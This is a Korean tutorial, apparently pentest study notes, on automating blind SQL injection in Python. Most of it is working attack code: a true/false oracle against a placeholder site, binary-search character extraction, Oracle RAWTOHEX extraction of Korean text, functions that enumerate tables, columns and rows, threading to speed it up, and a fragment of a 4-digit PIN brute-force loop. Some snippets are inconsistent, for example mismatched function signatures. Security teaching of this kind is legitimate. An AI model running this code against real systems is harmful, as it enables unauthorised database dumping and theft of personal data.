1. requests 모듈 기본 사용법​

GET 요청​

import requests
response = requests.get('https://www.naver.com')
print(response.status_code)
print(response.text)

POST 요청​

response = requests.post(url, headers=headers, cookies=cookies, data=data)

Burp Suite 요청을 Python으로 변환​

Burp Suite에서 캡처한 HTTP 요청을 Python requests 코드로 변환하는 방법:

  • headers, cookies, data 딕셔너리로 분리
  • Content-Length 자동 계산이므로 생략
  • Burp에서 우클릭 → Copy URL 활용

for pw in range(0, 10000):

Zero-fill 처리​

str(7).zfill(4)   → "0007"
str(879).zfill(4) → "0879"

if "로그인에 실패했습니다" not in response.text:

3. 이진 탐색(Binary Search) 알고리즘​

ASCII 값(1~127)을 순차 탐색하면 최대 127번, 이진 탐색은 최대 8번만에 찾을 수 있다.

원리 설명​

목표값 85('U') 찾기 과정 - 8단계

단계startendmidmid > 85?결과
1112764Noend = 64
216432Noend = 32
3336448Noend = 48
4496456Noend = 56
5576460Noend = 60
6616462Noend = 62
7636463Noend = 63
86464--찾음: 85

기본 구현​

def binary_search_ascii(check_function):
    start = 1
    end = 127
    while start < end:
        mid = (start + end) // 2
        if check_function(mid):
            start = mid + 1
        else:
            end = mid
    return start

경계 조건 주의사항​

조건True일 때False일 때비고
ascii > mid (초과)start = mid + 1end = mid일반적인 방식
ascii >= mid (이상)start = midend = mid - 1경계 처리 주의

경계 처리를 잘못하면 무한루프에 빠지거나 값이 1씩 틀어진다!

4. Blind SQL Injection 자동화​

전체 흐름​

  1. 글자수 추출: length(user) > N
  2. 각 글자의 ASCII 추출: ascii(substr(user,위치,1)) > N
  3. ASCII → 문자 변환: chr(ascii값)
  4. 결과 조합

참/거짓 판별 기준​

def is_true(query):
    url = f"http://target.com/product?id=61 and {query}"
    response = requests.get(url, cookies=cookies)
    return "MacBook" in response.text

이진 탐색 적용​

def get_ascii_binary(position):
    start = 1
    end = 127
    while start < end:
        mid = (start + end) // 2
        query = f"ascii(substr(user,{position},1)) > {mid}"
        if is_true(query):
            start = mid + 1
        else:
            end = mid
    return start

범용 문자열 추출 함수​

def extract_string(expression):
    # 서브쿼리 자동 감지: select로 시작하면 괄호로 감싸기
    if expression.strip().lower().startswith("select"):
        expression = f"({expression})"

    # 길이 자동 계산
    length = 0
    while True:
        if is_true(f"length({expression}) > {length}"):
            length += 1
        else:
            break

    result = ""
    for i in range(1, length + 1):
        ascii_val = get_ascii_binary(expression, i)
        char = chr(ascii_val)
        result += char
        print(f"\r진행중: {result}", end="", flush=True)

    print()
    return result

이진탐색 핵심 함수 전체 코드​

import requests

TARGET_URL = "http://target.com/product"
COOKIES = {"session": "your_session_cookie"}
INDICATOR = "MacBook"  # 참(True) 응답에 포함되는 문자열


def is_true(query):
    params = {"id": f"61 and {query}"}
    try:
        response = requests.get(TARGET_URL, params=params, cookies=COOKIES, timeout=5)
        return INDICATOR in response.text
    except requests.RequestException:
        return False


def get_ascii_binary(expression, position):
    start = 1
    end = 127
    while start < end:
        mid = (start + end) // 2
        query = f"ascii(substr({expression},{position},1)) > {mid}"
        if is_true(query):
            start = mid + 1
        else:
            end = mid
    return start

5. 한글 데이터 추출 (RAWTOHEX)​

문제점​

Oracle에서 한글 1글자 = 3바이트 → ASCII로는 직접 추출 불가

'김' → 0xEAB980 (UTF-8, 3바이트)
ascii(substr('김',1,1)) → 의미없는 값 반환

해결: RAWTOHEX 함수​

Oracle의 RAWTOHEX()로 모든 문자를 16진수로 변환하여 추출

-- 예시: '김철수' → 'EAB980ECB2A0EC8898'
SELECT RAWTOHEX('김철수') FROM dual;

HEX 추출 함수​

def extract_hex_string(expression):
    # RAWTOHEX로 감싸기
    hex_expr = f"RAWTOHEX({expression})"

    # HEX 문자열 길이 확인
    hex_length = 0
    while True:
        if is_true(f"length({hex_expr}) > {hex_length}"):
            hex_length += 1
        else:
            break

    hex_result = ""
    for i in range(1, hex_length + 1):
        # HEX 문자는 ASCII 48-57(0-9), 65-70(A-F)만 사용
        ascii_val = get_ascii_binary(hex_expr, i)
        hex_result += chr(ascii_val)
        print(f"\rHEX 추출중: {hex_result}", end="", flush=True)

    print()

    # HEX → bytes → UTF-8 디코딩
    try:
        return bytes.fromhex(hex_result).decode('utf-8')
    except Exception as e:
        print(f"디코딩 오류: {e}")
        return hex_result

사용 예시​

# ASCII만 있는 데이터: 일반 방식
username = extract_string("user")
print(f"사용자: {username}")

# 한글이 포함된 데이터: HEX 방식
korean_name = extract_hex_string("(select name from member where rownum=1)")
print(f"이름: {korean_name}")

6. 실전 자동화 스크립트 구조​

메타데이터 수집 함수​

def get_tables():
    """테이블명 추출 (MIN + NOT IN 방식)"""
    tables = []
    while True:
        not_in = ", ".join([f"'{t}'" for t in tables])
        if not_in:
            query = f"(select min(table_name) from user_tables where table_name not in ({not_in}))"
        else:
            query = "(select min(table_name) from user_tables)"

        table = extract_string(query)
        if not table:
            break
        tables.append(table)
        print(f"테이블 발견: {table}")
    return tables


def get_columns(table_name):
    """컬럼명 추출 (rownum 방식)"""
    columns = []
    rownum = 1
    while True:
        query = (
            f"(select column_name from "
            f"(select column_name, rownum rn from user_tab_columns "
            f"where table_name='{table_name}') where rn={rownum})"
        )
        col = extract_string(query)
        if not col:
            break
        columns.append(col)
        print(f"컬럼 발견: {col}")
        rownum += 1
    return columns


def get_data(table_name, column_name, row=1):
    """데이터 추출 (한글 자동 감지)"""
    query = (
        f"(select {column_name} from "
        f"(select {column_name}, rownum rn from {table_name}) "
        f"where rn={row})"
    )
    # 먼저 일반 방식 시도, 한글 포함 시 HEX 방식으로 전환
    try:
        return extract_string(query)
    except UnicodeDecodeError:
        return extract_hex_string(query)

7. 성능 최적화 팁​

  1. ASCII 범위 제한: 예상 문자 범위에 따라 탐색 범위 축소

    # 대문자만(65-90)
    start, end = 65, 90
    # 숫자만(48-57)
    start, end = 48, 57
    # HEX 문자(48-70)
    start, end = 48, 70

  2. 병렬 처리: ThreadPoolExecutor로 여러 위치 동시 추출

    from concurrent.futures import ThreadPoolExecutor

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(get_ascii_binary, expr, i): i for i in range(1, length+1)}

  3. 요청 속도 제어: 서버 과부하 방지

    import time
    time.sleep(0.1)  # 요청 사이 0.1초 대기

8. 실무 주의사항​

절대 하지 말아야 할 것​

금지 사항이유
SQLMap 같은 자동화 툴 사용페이로드 통제 불가, 실무에서 즉시 퇴출 대상
Time-based Blind InjectionSLEEP(), WAITFOR DELAY → 서버 다운 위험
Intruder로 무작위 대입비효율적, 탐지 쉬움, 요청 수 폭발적 증가

올바른 접근 방법​

레벨설명
레벨 1 (기본)Boolean-based Blind: 참/거짓 응답 차이 확인
레벨 2 (중급)이진 탐색 적용으로 요청 수 최소화
레벨 3 (고급)한글(RAWTOHEX), 병렬 처리, 서브쿼리 자동화

Python으로 직접 스크립트를 작성하여 페이로드를 완전히 제어하는 것이 실무의 표준이다.
